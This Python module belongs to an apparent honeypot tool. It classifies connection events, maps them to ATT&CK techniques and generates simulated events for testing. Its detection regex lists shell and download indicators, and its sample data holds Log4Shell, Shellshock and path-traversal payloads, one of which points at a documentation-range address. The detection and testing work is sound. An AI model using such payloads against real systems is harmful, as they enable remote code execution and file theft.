"""Honeypot hadisələrinin təsnifatı, ATT&CK uyğunlaşdırması, simulyasiya və monitor formatı.

Təsnifat heuristikdir: port + ilk baytlar. Dəqiq hücumçu niyyəti iddiası deyil.
"""
import ipaddress
import random
import re
from datetime import datetime, timedelta, timezone

from sqlalchemy.orm import Session

from .coverage import FULL, GAP, PARTIAL, gap_reason
from .models import HoneypotEvent, Technique, TechniqueAlias
from .monitor import HUBS

# port, xidmət, susmaya görə kateqoriya
PORT_PLAN = [
    (21, "FTP", "bruteforce"), (22, "SSH", "bruteforce"), (23, "Telnet", "bruteforce"),
    (25, "SMTP", "scan"), (80, "HTTP", "web"), (110, "POP3", "bruteforce"),
    (139, "NetBIOS", "smb"), (443, "HTTPS", "web"), (445, "SMB", "smb"),
    (1433, "MSSQL", "database"), (3306, "MySQL", "database"), (3389, "RDP", "rdp"),
    (5900, "VNC", "bruteforce"), (6379, "Redis", "database"), (8080, "HTTP-Alt", "web"),
]
SERVICE = {p: s for p, s, _ in PORT_PLAN}
PORT_CAT = {p: c for p, _, c in PORT_PLAN}

CATEGORY_LABEL = {
    "scan": "Scan", "bruteforce": "Brute force", "web": "Web probe", "smb": "SMB attempt",
    "rdp": "RDP attempt", "database": "Database", "exploit": "Exploit attempt",
}
# kateqoriya -> ATT&CK (heuristik)
CATEGORY_TECH = {
    "scan": "T1595", "bruteforce": "T1110", "web": "T1595.002", "smb": "T1210",
    "rdp": "T1133", "database": "T1190", "exploit": "T1190",
}
CATEGORIES = list(CATEGORY_LABEL)

_EXPLOIT = re.compile(
    r"(\$\{jndi:|/bin/(ba)?sh|cmd\.exe|powershell|wget\s+http|curl\s+http|\(\)\s*\{|\.\./\.\./|union\s+select|<script|/etc/passwd|eval\(|base64_decode)",
    re.I,
)
_CTRL = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]")
_SECRET = re.compile(r"(?im)^(pass(word)?\s+|authorization:\s*).*$")


def sanitize_payload(text: str, limit: int = 512) -> str:
    """İdarəedici simvolları təmizləyir, parol sətirlərini gizlədir, qısaldır."""
    text = _CTRL.sub("", text or "")
    text = _SECRET.sub(lambda m: m.group(0).split()[0] + " ***", text)
    return text[:limit]


def classify(dst_port: int, payload: str) -> tuple[str, str]:
    service = SERVICE.get(dst_port, f"port-{dst_port}")
    text = (payload or "").strip()
    if text and _EXPLOIT.search(text):
        return service, "exploit"
    if not text:
        return service, "scan"  # yalnız bağlantı, data yox
    return service, PORT_CAT.get(dst_port, "scan")


_AUTH_CUE = re.compile(r"(?im)^(user|pass|login:|auth)\b")
BRUTE_HITS = 5  # eyni IP -> eyni port, 10 dəqiqədə bu qədər və ya çox bağlantı = brute force


def refine(db: Session, ip: str, port: int, cat: str, payload: str, batch: dict) -> str:
    """Brute force yalnız giriş cəhdi əlaməti (USER/PASS/login) və ya təkrarlanan bağlantı olduqda sayılır.
    Tək bağlantı və banner oxunması skandır."""
    if PORT_CAT.get(port) != "bruteforce" or cat == "exploit":
        return cat
    if _AUTH_CUE.search(payload or ""):
        return "bruteforce"
    from sqlalchemy import func

    key = (ip, port)
    seen = db.query(func.count(HoneypotEvent.id)).filter(
        HoneypotEvent.src_ip == ip, HoneypotEvent.dst_port == port, HoneypotEvent.simulated.is_(False),
        HoneypotEvent.ts >= datetime.now(timezone.utc) - timedelta(minutes=10),
    ).scalar() or 0
    batch[key] = batch.get(key, 0) + 1
    return "bruteforce" if seen + batch[key] >= BRUTE_HITS else "scan"


def valid_ip(ip: str) -> bool:
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def resolve_technique(db: Session, category: str):
    """Kateqoriyanın ATT&CK ID-si (ləğv olunubsa yenisi). Bazada yoxdursa None."""
    tid = CATEGORY_TECH.get(category)
    if not tid:
        return None
    alias = db.get(TechniqueAlias, tid)
    tid = alias.new_id if alias else tid
    return tid if db.get(Technique, tid) else None


def event_out(e: HoneypotEvent) -> dict:
    return {
        "id": e.id,
        "ts": e.ts.isoformat(timespec="seconds") if e.ts else None,
        "sensor": e.sensor,
        "src_ip": e.src_ip,
        "src_port": e.src_port,
        "dst_port": e.dst_port,
        "proto": e.proto,
        "service": e.service,
        "category": e.category,
        "category_label": CATEGORY_LABEL.get(e.category, e.category),
        "technique": e.technique_id,
        "payload": e.payload,
        "place": e.place,
        "country": e.country, "city": e.city, "asn": e.asn,
        "organization": e.organization, "location_source": e.location_source,
        "geo": e.lat is not None,
        "simulated": bool(e.simulated),
    }


def live_event(e: HoneypotEvent, units: dict) -> dict:
    """Monitor formatı: nəticə (aşkarlandı/qismən/qaçırıldı) texnikanın cari əhatəsindən götürülür."""
    u = units.get(e.technique_id or "")
    if u:
        level, name, rule, groups, blind = u["level"], u["name"], u["best_rule"] or None, u["groups"], bool(u["blind"])
        tactic = u["tactic_names"][0] if u["tactic_names"] else ""
        tactic_key = u["tactics"][0] if u["tactics"] else ""
        cover = {FULL: f"Qayda: {u['best_rule']}", PARTIAL: f"{u['best_rule']}: aktiv və ya test olunmuş deyil",
                 GAP: gap_reason(u)}[level]
    else:
        level, name, rule, groups, blind, tactic, tactic_key = GAP, e.technique_id or "Naməlum", None, 0, False, "", ""
        cover = "Texnika matrisdə tapılmadı"
    return {
        "id": e.id,
        "ts": e.ts.isoformat(timespec="seconds") if e.ts else None,
        "technique": e.technique_id or "",
        "name": name,
        "tactic": tactic,
        "tactic_key": tactic_key,
        "outcome": {FULL: "detected", PARTIAL: "partial", GAP: "missed"}[level],
        "blind": blind,
        "reason": f"{CATEGORY_LABEL.get(e.category, e.category)}. {cover}",
        "rule": rule,
        "groups": groups,
        "host": f"{e.service}:{e.dst_port}",
        "category": e.category, "category_label": CATEGORY_LABEL.get(e.category, e.category),
        "country": e.country, "city": e.city, "asn": e.asn,
        "organization": e.organization, "location_source": e.location_source,
        "source_ip": e.src_ip, "destination_port": e.dst_port,
        "simulated": bool(e.simulated),
        "src": {
            "name": e.place or e.src_ip,
            "lat": e.lat,
            "lon": e.lon,
            "ip": e.src_ip,
        },
    }


# ---------------------------------------------------------------- simulyasiya
_SAMPLES = {
    "scan": [""],
    "bruteforce": ["SSH-2.0-libssh_0.9.6", "USER admin", "USER root", "login: admin"],
    "web": ["GET /.env HTTP/1.1", "GET /wp-login.php HTTP/1.1", "GET /phpmyadmin/ HTTP/1.1", "GET /admin HTTP/1.1"],
    "smb": ["\x00\x00\x00\x85\xffSMBr", "SMB negotiate"],
    "rdp": ["\x03\x00\x00\x13\x0e\xe0 Cookie: mstshash=admin"],
    "database": ["SELECT version()", "INFO", "\x0a5.7.0-probe"],
    "exploit": ["GET /?x=${jndi:ldap://203.0.113.9/a} HTTP/1.1", "GET /cgi-bin/x HTTP/1.1 () { :;}; /bin/sh", "GET /../../etc/passwd HTTP/1.1"],
}
_WEIGHTS = {"scan": 30, "bruteforce": 28, "web": 20, "smb": 7, "rdp": 7, "database": 5, "exploit": 3}
_NETS = ["198.51.100", "203.0.113", "192.0.2"]  # RFC 5737


def simulate(db: Session, n: int, rng: random.Random | None = None) -> int:
    """Sınaq üçün sintetik hadisələr. Sensor adı 'simulyasiya', simulated=True."""
    rng = rng or random
    cats = list(_WEIGHTS)
    ports_by_cat: dict = {}
    for p, _, c in PORT_PLAN:
        ports_by_cat.setdefault(c, []).append(p)
    now = datetime.now(timezone.utc)
    for _ in range(n):
        cat = rng.choices(cats, weights=[_WEIGHTS[c] for c in cats])[0]
        payload = rng.choice(_SAMPLES[cat])
        pool = ports_by_cat.get("web" if cat == "exploit" else cat) or [p for p, _, _ in PORT_PLAN]
        port = rng.choice(pool) if cat != "scan" else rng.choice([p for p, _, _ in PORT_PLAN])
        service, real_cat = classify(port, payload)
        hub = rng.choice(HUBS)
        db.add(HoneypotEvent(
            ts=now - timedelta(seconds=rng.randint(0, 20)),
            sensor="simulyasiya", src_ip=f"{rng.choice(_NETS)}.{rng.randint(2, 250)}", src_port=rng.randint(1025, 65000),
            dst_port=port, proto="tcp", service=service, category=real_cat,
            technique_id=resolve_technique(db, real_cat), payload=sanitize_payload(payload),
            lat=hub[1], lon=hub[2], place=hub[0], simulated=True,
        ))
    db.commit()
    return n
